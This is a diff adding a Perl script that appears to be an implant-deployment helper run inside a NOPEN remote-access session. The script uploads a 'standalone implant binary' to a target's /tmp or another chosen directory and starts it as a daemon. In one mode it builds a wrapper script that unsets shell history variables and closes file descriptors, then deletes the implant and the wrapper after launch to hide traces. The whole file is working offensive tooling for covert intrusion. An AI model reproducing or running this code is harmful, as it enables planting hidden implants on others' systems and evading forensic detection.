@@ -1,0 +1,302 @@
+#!/usr/bin/env perl
+#
+$VER="1.1.0.2";
+my $localfile="";
+my $remotename="";
+my $remotepath="";
+my $genpastable=0;
+my $start=1;
+my $startalt=0;
+my $putfile=0;
+my $putscript=0;
+my $beforeargs="";
+my $afterargs="";
+myinit(); 
+
+sub dofileupload {
+  my $filesize=0;
+
+  $filesize = -s $localfile;
+  #dbg("in autodeploy dofileupload, filesize = =$filesize=");
+  unless ($filesize and $filesize > 0) {
+    mydie("Zero-length file detected. Use -touch instead.");
+  }
+
+  # Check for any files on target first.
+  offerabort
+    (
+     "${COLOR_FAILURE}".`ls -lt $localfile`."${COLOR_NORMAL}".
+     "\n\nPreparing to do upload of $localfile to $remotepath/$remotename."
+    );
+  ($output,$nopenlines,@output) = nopenlss("-UFQ","$remotepath/$remotename");
+  if (grep {/\/$remotename$/} split(/\s+/,$output)) {
+    mydie("$remotepath/$remotename exists on target!\n\n\n@output\n\n");
+  }
+  
+  # Do the upload
+  doit("-put $localfile $remotepath/$remotename");
+  $putfile++;
+
+  progprint("$localfile uploaded successfully to target at $remotepath/$remotename");
+  return 0;
+}
+
+dofileupload();
+
+sub dobinarystart {
+  my $cmdline="";
+  my $statuscode=0;
+  my $currentline="";
+  my @pids=();
+  my %origpids=();
+  my @ourpslines=();
+  my $message="$remotepath/$remotename started at PID";
+
+  # Build the command line used to start the binary on target.
+  if ($genpastable) {
+    # We need to close file descriptors first.
+    $cmdline = "#\!/bin/sh\nunset HISTFILE\nunset HISTFILESIZE\nunset HISTSIZE\n/bin/rm -f $remotepath/.$remotename\n";
+    my $count = 0;
+    my $upperbound = 9;
+    # Find the upper bound of descriptors that we need to close.
+    my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+	$serverver,$targetwdir,$targetos,$targetcwd,$targetpid,$targetppid,
+	$targetport) =  parsestatus();
+    my ($filedes,$nopenlines,@filedes) = doit("-ls -1 /proc/$targetpid/fd");
+    $filedes = "";
+    for (my $i=0;$i<@filedes;$i++) {
+      $filedes[$i] =~ s,.*/,,g;
+      $filedes[$i] =~ s,\D,,g;
+    }
+    dbg("in autodeploy dobinarystart, got filedes list =@filedes= upperbound=$upperbound= filedes=$filedes");
+#    ($upperbound) = $filedes[$#filedes] =~ /(\d+)\s*$/;
+#$upperbound=255;
+    dbg("in autodeploy dobinarystart, upper bound=$upperbound= startat0=$startatzero=");
+    foreach (@filedes) {
+      # This next will skip empty ones AND "0" which is what we want.
+      next unless  $_;
+      $cmdline .= "\nexec " unless $count++ % 16;
+      $cmdline .= "$_>&- ";
+    }
+    $cmdline .= "\n";
+    $cmdline .= "cd $remotepath\n" if $startalt;
+  }
+  if ($start) {
+    $cmdline .= "PATH=$remotepath " if length $beforeargs;
+    $cmdline .= "$beforeargs " if length $beforeargs;
+    $cmdline .= "$remotename $afterargs &\n";
+  }
+  if ($startalt) {
+    $cmdline .= "$beforeargs " if length $beforeargs;
+    $cmdline .= "./$remotename $afterargs &\n";
+  }
+  if ($genpastable) {
+    $cmdline .= "retval=\$\?\n/bin/sleep 1\n/bin/rm -f $remotepath/$remotename\nexit \$retval\n";
+  }
+  chomp($cmdline) unless $genpastable;
+
+  # Find our remotename and its PID(s) in the processlist. We need something to skip.
+  ($output,$nopenlines,@output) = doit("=ps | grep $remotename");
+  my @grepoutput = grep {!/grep/} @output;
+  if (scalar @grepoutput > 0) {
+    foreach $psline (@grepoutput) {
+#      $seenit{$psline};
+      #dbg("in autodeploy dobinarystart, parsing psline =$psline=");
+      if ($psline =~ /^.*root\s*(\d+).*$remotename/) {
+        #dbg("in autodeploy dobinarystart, found an image with our name at pid =$1=");
+	$origpids{$1}++;
+      }
+    }
+    dbg("in autodeploy dobinarystart, origpids=%origpids=");
+  }
+  unless ($genpastable) {
+    offerabort
+      (
+       "Ready to start $remotepath/$remotename using the following command line:\n\n".
+       "$cmdline"
+      );
+    doit("-cd $remotepath") if $startalt;
+    ($output,$nopenlines,@output) = doit("$cmdline ; echo \$?");
+    ($statuscode) = grep {/^(\d+)/} split(/\s+/,$output);
+    dbg("in autodeploy dobinarystart, got status code =$statuscode=");
+    doit("-cdp") if $startalt;
+  }
+  else {
+    # Create the script to be uploaded.
+    my $autocmdline="";
+    unlink("$opup/deploy.auto");
+    open(SCRIPT, "> $opup/deploy.auto") or mydie("Can't open binary start script: $!");
+    select SCRIPT;
+    print $cmdline;
+    close(SCRIPT);
+    select STDOUT;
+    offerabort
+      (
+       "Because you passed -p, we need to start the binary using a separate script.\n\n".
+       "The following script has been generated and will be uploaded and invoked as ${COLOR_FAILURE}$remotepath/\.$remotename${COLOR_NORMAL} when we continue:\n\n".
+       "$cmdline"
+      );
+
+    # Upload the script and run it.
+    doit("-put $opup/deploy.auto $remotepath/\.$remotename");
+    $putscript++;
+
+    if ($start) {
+      $autocmdline = "PATH=$remotepath \.$remotename";
+    }
+    if ($startalt) {
+      $autocmdline = "./\.$remotename";
+    }
+    doit("-cd $remotepath") if $startalt;
+    ($output,$nopenlines,@output) = doit("$autocmdline ; echo \$?");
+    ($statuscode) = grep {/^(\d+)/} split(/\s+/,$output);
+    dbg("in autodeploy dobinarystart, got deploy.auto status code =$statuscode=");
+    doit("-cdp") if $startalt;
+  }
+
+  # Find our remotename and its PID(s) in the processlist, skipping what was there before.
+  ($output,$nopenlines,@output) = doit("=ps | grep $remotename");
+  @grepoutput = grep {!/grep/} @output;
+  if (!(scalar @grepoutput > 0)) {
+    doit("/bin/rm -f $remotepath/$remotename");
+    mydie("$remotepath/$remotename failed to start!!");
+  }
+  foreach $psline (@grepoutput) {
+#    next if $seenit{$psline};
+    dbg("in autodeploy dobinarystart, parsing psline =$psline=");
+    if ($psline =~ /^.*root\s*(\d+).*$remotename/) {
+      # Did we see it already?
+      #dbg("in autodeploy dobinarystart, found an image with our name at pid =$1=");
+      my $pid = $1;
+      #dbg("in autodeploy dobinarystart, found a pid =$origpid=");
+      next if ($origpids{$1}) ;
+      push(@ourpslines,"$psline\n");
+      push(@pids,$pid);
+    }
+  }
+
+  # Now, get rid of everything that was here before us.
+
+  # Build our banner.
+  $message .= "s" if (scalar @pids > 1);
+  foreach $pid (@pids) {
+    $message .= " $pid";
+  }
+  $message .= " with status code $statuscode:\n\n${COLOR_NOTE}@ourpslines${COLOR_NORMAL}";
+
+  doit("/bin/rm -f $remotepath/$remotename");
+  progprint($message);
+  return 0;
+}
+
+dobinarystart() if $start or $startalt;
+
+# End with true value as we require this script elsewhere.
+1;
+#ENDMAIN
+
+sub mymydie {
+  if ($putfile) {
+    myalert("You still have $remotepath/$remotename up there...");
+    doit("-rm $remotepath/$remotename");
+  }
+  if ($putscript) {
+    myalert("You still have $remotepath/.$remotename up there...");
+    doit("-rm $remotepath/$remotename");
+  }
+  mydie(@_);
+}
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs deploy @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }  
+    require $autoutils;
+    $prog = "-gs deploy";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session when \"$prog\" or
+\"=deploy\" is used.
+
+";
+  $gsusagetext="
+Usage: $prog [options]
+
+$prog uploads a standalone implant binary to a target, verifies with a
+ simple checksum that it is intact, and starts the binary in daemonized form.
+
+OPTIONS
+ -h/-v       Show help/version
+ -l path     Location of local file to be uploaded and started
+ -r name     Remote name of uploaded file
+ -d dir      Full path of remote location of uploaded file (def. /tmp)
+ -B ARGS     Arguments to insert BEFORE the binary \$NAME
+ -A ARGS     Arguments to insert AFTER the binary \$NAME
+ -S          Run the binary using ./\$NAME
+ -W name     $prog will build a script to execute the uploaded file. Both
+             file and script will be uploaded, the script will first close
+             all file descriptors bigger than 2.
+
+
+";
+  $gsusagetext_notused="
+ -p         Start the binary using deploy.auto
+";
+
+  mydie("bad option(s)") if (! Getopts( "hvl:r:d:pB:A:sSW:" ) );
+  usage() if ($opt_h or $opt_v);
+
+  mydie("-W and -r cannot be the same name ($opt_W)")
+    if ($opt_W eq $opt_r);
+
+  mydie("-W and -r cannot contain a /")
+    if ("$opt_W$opt_r" =~ m,/,);
+
+  mydie("You must provide a local filename with -l")
+    unless ($opt_l and length $opt_l > 0);
+
+  dbg("in autodeploy, opt_l = =$opt_l=");
+  mydie("Local file path does not exist!") unless (-e $opt_l);
+  $localfile = $opt_l;
+
+#  mydie(
+
+  mydie("You must provide a filename with -r")
+    unless ($opt_r and length $opt_r > 0);
+  dbg("in autodeploy, opt_r = =$opt_r=");
+  $remotename = $opt_r;
+
+  $remotepath = "/tmp";
+  if ($opt_d and length $opt_d > 0) {
+    dbg("in autodeploy, opt_d = =$opt_d=");
+    mydie("Remote path does not begin with a slash!") unless ($opt_d =~ m,^/,);
+    $remotepath = $opt_d;
+  }
+  $genpastable = $opt_p;
+  $startalt = $opt_S;
+  $start = 0 if $startalt;
+  $beforeargs = $opt_B;
+  $afterargs = $opt_A;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}
